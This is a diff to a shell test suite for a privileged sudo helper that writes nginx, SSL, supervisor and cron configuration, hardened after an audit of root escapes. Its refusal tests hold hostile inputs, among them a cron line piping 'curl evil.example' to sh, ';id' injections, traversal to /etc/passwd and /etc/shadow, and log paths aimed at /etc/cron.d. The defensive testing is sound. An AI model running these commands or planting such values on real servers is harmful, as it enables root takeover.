@@ -117,20 +117,19 @@ ok "version" "1.0.0" version
 ok "nginx-test" "run: nginx -t" nginx-test
 ok "nginx-reload" "run: service nginx reload" nginx-reload
 ok "php-fpm" "run: service php8.4-fpm reload" php-fpm-reload 8.4
-IN=$'server {}\n' ok "vhost" "write: /etc/nginx/sites-available/example.com (644)" vhost-write example.com
-ok "vhost-read" "read: /etc/nginx/sites-available/example.com" vhost-read example.com
+ok "vhost" "write: /etc/nginx/sites-available/example.com (644)" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
+ok "vhost-backup" "run: cp /etc/nginx/sites-available/example.com /var/lib/eeploi/nginx/example.com/vhost" vhost-backup example.com
+ok "vhost-restore" "run: cp /var/lib/eeploi/nginx/example.com/vhost /etc/nginx/sites-available/example.com" vhost-restore example.com
 ok "vhost-enable" "run: ln -sfn /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/example.com" vhost-enable example.com
 ok "vhost-disable" "run: rm -f /etc/nginx/sites-enabled/example.com" vhost-disable example.com
 ok "vhost-remove" "run: rm -f /etc/nginx/sites-enabled/example.com /etc/nginx/sites-available/example.com" vhost-remove example.com
 ok "root" "root /home/eeploi/example.com/current/public;" vhost-set-root example.com /home/ploi/example.com/public /home/eeploi/example.com/current/public
 ok "vhost-set-cert" "ssl_certificate /etc/nginx/ssl/eeploi-example.com.crt;" vhost-set-cert example.com
 ok "ssl-csr" "run: openssl req -new -key /etc/nginx/ssl/eeploi-example.com.key -subj /CN=example.com" ssl-csr eeploi-example.com
-IN=$'PEM\n' ok "certificate" "write: /etc/nginx/ssl/eeploi-example.com.crt (644)" ssl-write eeploi-example.com
+IN=$'-----BEGIN CERTIFICATE-----\nMIIBszCCAVmgAwIBAgIU\n-----END CERTIFICATE-----\n' ok "certificate" "write: /etc/nginx/ssl/eeploi-example.com.crt (644)" ssl-write eeploi-example.com
 ok "ssl-remove" "run: rm -f /etc/nginx/ssl/example.com.crt /etc/nginx/ssl/example.com.key" ssl-remove example.com
-ok "ssl-read" "read: /etc/nginx/ssl/example.com" ssl-read example.com
-IN=$'ssl_certificate x;\n' ok "ssl-include-write" "write: /etc/nginx/ssl/example.com (644)" ssl-include-write example.com
-IN=$'[program:eeploi-example.com-horizon]\ncommand=php artisan horizon\nuser=eeploi\n' \
-  ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-example.com-horizon.conf (644)" supervisor-write eeploi-example.com-horizon
+IN='php artisan horizon' ok "supervisor" "write: /etc/supervisor/conf.d/eeploi-example.com-horizon.conf (644)" \
+  supervisor-write eeploi-example.com-horizon /home/eeploi/example.com/current 2
 ok "supervisor-remove" "run: rm -f /etc/supervisor/conf.d/eeploi-example.com-a.conf" supervisor-remove eeploi-example.com-a
 ok "supervisor-remove-site" "" supervisor-remove-site example.com
 ok "pause" "run: mv /etc/supervisor/conf.d/worker-233475.conf /etc/supervisor/conf.d/worker-233475.conf.paused" supervisor-pause /etc/supervisor/conf.d/worker-233475.conf
@@ -139,11 +138,11 @@ ok "supervisor-update" "run: supervisorctl update" supervisor-update
 IN=$'* * * * * eeploi php8.4 /home/eeploi/example.com/current/artisan schedule:run > /dev/null 2>&1\n' \
   ok "cron" "write: /etc/cron.d/eeploi-example.com (644)" cron-write example.com
 ok "cron-remove" "run: rm -f /etc/cron.d/eeploi-example.com" cron-remove example.com
-ok "crontab-backup" "run: cp /etc/crontab /var/lib/eeploi/crontab/example.com" crontab-backup example.com
-ok "crontab-restore" "run: cp /var/lib/eeploi/crontab/example.com /etc/crontab" crontab-restore example.com
-IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines" "remove from /etc/crontab: 0 3 * * * ploi php /home/ploi/a/artisan x" crontab-remove-lines
-ok "env" "run: install -o eeploi -g eeploi -m 640" env-install /home/ploi/example.com/.env /home/eeploi/example.com/.env eeploi
-ok "storage-copy" "run: rsync -a --chown=eeploi:eeploi /home/ploi/a/storage/ /home/eeploi/a/storage/" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi
+ok "crontab-restore" "add back to /etc/crontab: the lines in /var/lib/eeploi/crontab/example.com" crontab-restore example.com
+IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines" "remove from /etc/crontab: 0 3 * * * ploi php /home/ploi/a/artisan x" crontab-remove-lines example.com
+IN=$'0 3 * * * ploi php /home/ploi/a/artisan x\n' ok "crontab-remove-lines saves" "save: /var/lib/eeploi/crontab/example.com" crontab-remove-lines example.com
+ok "env" "runuser -u eeploi -- sh -c" env-install /home/ploi/example.com/.env /home/eeploi/example.com/.env eeploi
+ok "storage-copy" "run: tar -C /home/ploi/a/storage -cf - . | runuser -u eeploi -- tar -C /home/eeploi/a/storage -xf - --no-same-owner" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi
 
 echo "== refusals"
 AS='' refuse "not through sudo" "run through sudo" version
@@ -151,36 +150,70 @@ AS=root refuse "root as caller" "run through sudo" version
 AS=www-data refuse "other user as caller" "run through sudo" version
 refuse "no subcommand" "usage"
 refuse "unknown subcommand" "unknown subcommand" rm -rf /
-IN=$'server {}\n' refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id'
+refuse "domain with a semicolon" "invalid domain" vhost-write 'example.com;id' /run/php/php8.4-fpm.sock
 refuse "domain without a dot" "invalid domain" vhost-enable localhost
-refuse "domain with a slash" "invalid domain" vhost-read ../../etc/passwd
+refuse "domain with a slash" "invalid domain" vhost-backup ../../etc/passwd
 refuse "uppercase domain" "invalid domain" vhost-enable Example.com
 refuse "php version" "invalid PHP version" php-fpm-reload '8.4;id'
 refuse "php version without dot" "invalid PHP version" php-fpm-reload 84
 refuse "path with .." "invalid path" env-install /home/ploi/a/../../etc/shadow /home/eeploi/x/.env eeploi
 refuse "path outside home" "outside the allowed home folders" storage-copy /etc /home/eeploi/x/storage eeploi
 refuse "path in another home" "outside the allowed home folders" storage-copy /home/root/x /home/eeploi/x/storage eeploi
-refuse "copy into another home" "not in /home/eeploi" env-install /home/ploi/a/.env /home/ploi/b/.env eeploi
+AS=ploi refuse "copy from own home" "source cannot be in /home/ploi" env-install /home/ploi/a/.env /home/ploi/b/.env ploi
+refuse "copy into ploi's home" "not in /home/eeploi" env-install /home/ploi/a/.env /home/ploi/b/.env eeploi
 refuse "other owner" "owner must be eeploi" env-install /home/ploi/a/.env /home/eeploi/a/.env root
 refuse "root as new root" "outside the allowed home folders" vhost-set-root example.com /home/ploi/x/public /etc
 refuse "vhost-set-root arguments" "usage" vhost-set-root example.com /home/ploi/x/public
 refuse "program name" "invalid program" supervisor-remove nginx
-IN=$'[program:eeploi-example.com-a]\ncommand=id\nuser=root\n' refuse "daemon as root" "daemons run as eeploi" supervisor-write eeploi-example.com-a
-IN=$'[program:eeploi-example.com-a]\nuser=eeploi\n[include]\nfiles=/tmp/*\n' refuse "second section" "unexpected config line" supervisor-write eeploi-example.com-a
-IN=$'[program:eeploi-example.com-a]\ncommand=id\n' refuse "daemon without user" "exactly one user" supervisor-write eeploi-example.com-a
-IN=$'[program:eeploi-example.com-b]\nuser=eeploi\n' refuse "daemon with another name" "must start with" supervisor-write eeploi-example.com-a
+IN='id' refuse "daemon directory outside home" "outside the allowed home folders" supervisor-write eeploi-example.com-a /etc 1
+IN='id' refuse "daemon directory in another home" "not in /home/eeploi" supervisor-write eeploi-example.com-a /home/ploi/a 1
+IN='id' refuse "daemon processes" "processes must be 1 to 32" supervisor-write eeploi-example.com-a /home/eeploi/a 33
+IN='id' refuse "daemon processes zero" "processes must be 1 to 32" supervisor-write eeploi-example.com-a /home/eeploi/a 0
+IN='' refuse "daemon empty command" "empty command" supervisor-write eeploi-example.com-a /home/eeploi/a 1
 refuse "pause any file" "invalid Supervisor config" supervisor-pause /etc/passwd
 IN=$'* * * * * root php /home/eeploi/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron as root" "only" cron-write example.com
 IN=$'* * * * * eeploi curl evil.example | sh\n' refuse "cron any command" "only" cron-write example.com
 IN=$'* * * * * eeploi php /etc/x/artisan schedule:run > /dev/null 2>&1\n' refuse "cron outside home" "outside the allowed home folders" cron-write example.com
 refuse "certificate name" "invalid domain" ssl-csr ../../etc/passwd
-refuse "crontab-remove-lines arguments" "usage" crontab-remove-lines /etc/passwd
+refuse "crontab-remove-lines arguments" "usage" crontab-remove-lines example.com /etc/passwd
+
+echo "== root escapes (server-access audit, 2026-11-09)"
+# vhost-write: the vhost is built by the helper; caller content can't reach nginx (root opens log files).
+IN=$'access_log /etc/cron.d/x;\n' refuse "vhost from stdin" "usage" vhost-write example.com
+IN=$'access_log /etc/cron.d/x;\n' lacks "vhost ignores stdin" "/etc/cron.d" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
+ok "vhost logs in /var/log/nginx" "access_log /var/log/nginx/eeploi-example.com-access.log;" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
+ok "vhost root in the caller's home" "root /home/eeploi/example.com/current/public;" vhost-write example.com /run/php/php8.4-fpm-eeploi.sock
+refuse "vhost socket" "invalid PHP-FPM socket" vhost-write example.com /tmp/evil.sock
+# ssl-include-write: gone; take-over backups are made and restored by root (vhost-backup, vhost-restore).
+IN=$'access_log /etc/cron.d/x;\n' refuse "ssl include from stdin" "unknown subcommand" ssl-include-write example.com
+refuse "vhost-read gone" "unknown subcommand" vhost-read example.com
+refuse "ssl-read gone" "unknown subcommand" ssl-read example.com.key
+# supervisor-write: built from arguments; one command line, log in /var/log/supervisor.
+IN=$'[program:eeploi-example.com-a]\ncommand=id\nuser=eeploi\nstdout_logfile=/etc/cron.d/x\n' refuse "supervisor config from stdin" "usage" supervisor-write eeploi-example.com-a
+IN=$'id\nstdout_logfile=/etc/cron.d/x' refuse "supervisor extra line" "one line" supervisor-write eeploi-example.com-a /home/eeploi/a 1
+IN='php artisan horizon' ok "supervisor log in /var/log/supervisor" "stdout_logfile=/var/log/supervisor/eeploi-example.com-a.log" supervisor-write eeploi-example.com-a /home/eeploi/a 1
+IN='php artisan horizon' ok "supervisor as the caller" "user=eeploi" supervisor-write eeploi-example.com-a /home/eeploi/a 1
+# storage-copy and env-install: root only reads from /home/ploi or /home/forge; the caller writes.
+refuse "storage from own home" "source must be in /home/ploi or /home/forge" storage-copy /home/eeploi/a/storage /home/eeploi/b/storage eeploi
+refuse "env from own home" "source must be in /home/ploi or /home/forge" env-install /home/eeploi/a/.env /home/eeploi/b/.env eeploi
+lacks "env not written by root" "install -o" env-install /home/ploi/a/.env /home/eeploi/a/.env eeploi
+lacks "storage not written by root" "rsync" storage-copy /home/ploi/a/storage /home/eeploi/a/storage eeploi
+# self-update: no downgrade below the installed version.
+BIN="$WORK/keyed-helper" refuse "downgrade" "no downgrade" self-update 0.9.9
+BIN="$WORK/keyed-helper" ok "same version" "download:" self-update 1.0.0
+# crontab: only ploi or forge jobs in their home; restore adds back only those lines.
+IN=$'17 * * * * root cd / && run-parts --report /etc/cron.hourly\n' refuse "system cron line" "only ploi or forge jobs" crontab-remove-lines example.com
+IN=$'* * * * * ploi php /etc/x/artisan schedule:run\n' refuse "ploi job outside home" "only ploi or forge jobs" crontab-remove-lines example.com
+IN='' refuse "no cron lines" "no lines given" crontab-remove-lines example.com
+refuse "crontab-backup gone" "unknown subcommand" crontab-backup example.com
+# ssl-write: only a PEM certificate.
+IN=$'access_log /etc/cron.d/x;\n' refuse "ssl-write not a certificate" "not one PEM certificate" ssl-write example.com
 
 echo "== deploy user from helper.conf"
 lacks "default homes have no deploy" "deploy" version
 AS=deploy refuse "deploy without config" "run through sudo" version
 AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy from config" "1.0.0" version
-AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home allowed" "run: install -o deploy -g deploy -m 640 /home/ploi/a/.env /home/deploy/a/.env" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
+AS=deploy ETC_DIR="$WORK/etc-conf" ok "deploy home allowed" "runuser -u deploy -- sh -c" env-install /home/ploi/a/.env /home/deploy/a/.env deploy
 ETC_DIR="$WORK/etc-conf" ok "eeploi still allowed with config" "1.0.0" version
 ETC_DIR="$WORK/etc-badline" refuse "config with another line" "invalid line" version
 ETC_DIR="$WORK/etc-root" refuse "config with root" "cannot be root" version
